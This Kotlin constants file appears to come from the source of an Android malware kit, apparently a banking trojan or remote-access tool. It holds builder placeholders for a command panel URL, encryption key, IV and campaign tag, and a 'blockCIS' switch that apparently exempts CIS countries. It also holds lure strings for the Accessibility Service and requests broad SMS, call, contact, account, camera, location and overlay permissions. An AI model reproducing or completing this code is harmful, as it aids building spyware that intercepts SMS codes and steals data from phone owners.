package com.xxx.zzz.globp

import android.Manifest
import com.xxx.zzz.BuildConfig

object Constantsfd {

    val debug = if (BuildConfig.DEBUG) false else "%debug1%" == "%debug%"
    val blockCIS = if (BuildConfig.DEBUG) false else "%blockCIS1%" == "%blockCIS%"
    val addWaitView = if (BuildConfig.DEBUG) false else "%addWaitView1%" == "%addWaitView%"

    //--------------Settings Connect Panal---------
    val DEVELOPMENT_SERVER: String = if (BuildConfig.DEBUG) "http://127.0.0.1:3434" else "%INSERT_URL_HERE%"
    val k: String = if (BuildConfig.DEBUG) "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf" else "%INSERT_KEY_HERE%"
    val IV: String = if (BuildConfig.DEBUG) "0123456789abcdef" else "%INSERT_INITIAL_KEY_HERE%"
    val tag: String = if (BuildConfig.DEBUG) "tag" else "%INSERT_TAG_HERE%"

    //------------Constants replace java class------
    val access1: String = if (BuildConfig.DEBUG) "Start Accessibility" else "%INSERT_ACCESS1_HERE%"
    val access2: String =
        if (BuildConfig.DEBUG) "Accessibility Service" else "%INSERT_ACCESS2_HERE%"
    val acname: String = "%Enable_Accessibility_Service%"

    val PERMISSIONS = arrayOf(
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.GET_ACCOUNTS,
        Manifest.permission.CAMERA
    )

    val PERMISSIONS2 = arrayOf(
        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    )

    val PERMISSIONS3 = arrayOf(
        Manifest.permission.SYSTEM_ALERT_WINDOW
    )

    val PERMISSIONSA = PERMISSIONS + PERMISSIONS2 + PERMISSIONS3
}